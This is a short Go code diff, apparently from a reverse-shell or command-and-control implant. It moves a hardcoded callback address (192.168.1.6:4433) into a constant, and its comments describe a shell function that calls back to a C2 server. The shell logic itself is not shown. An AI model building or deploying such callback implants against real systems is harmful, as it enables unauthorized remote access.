@@ -16,6 +16,9 @@ import (
     "syscall"
 )
 
+// Customize this based on the IP address and call back port
+const c2IP = "192.168.1.6:4433"
+
 // Client to server heartbeat to determine if c2 server is running
 func shell(addr string) {
 	check_conn:
@@ -48,7 +51,5 @@ func shell(addr string) {
 
 // Main establishes the call back to the c2 server IP address and port specified
 func main() {
-	var c2_ip string
-	c2_ip = "192.168.1.6:4433"
-	shell(c2_ip)
+	shell(c2IP)
 }
